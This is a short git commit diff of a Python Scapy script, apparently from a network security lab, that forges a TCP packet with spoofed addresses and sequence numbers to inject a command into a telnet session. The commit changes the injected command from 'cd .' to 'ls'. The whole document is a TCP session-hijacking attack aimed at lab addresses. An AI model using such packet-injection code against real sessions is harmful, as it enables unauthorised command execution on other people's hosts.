1141b7eb537b7827224d2a7be0a63dc113ec311f
Ethan Harris <576552241qwj@gmail.com>
2021-12-06 10:27:29 +0800

    main

--- Task3.py
+++ Task3.py
@@ -2,8 +2,8 @@
 from scapy.all import *
 eth = Ether(src="02:42:0a:09:00:06", dst="02:42:0a:09:00:05")
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=59956, dport=23, flags="AP", seq=516335993, ack=2142703168)
-data = "cd .\r"
+tcp = TCP(sport=59956, dport=23, flags="AP", seq=516336020, ack=2142703271)
+data = "ls\r"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
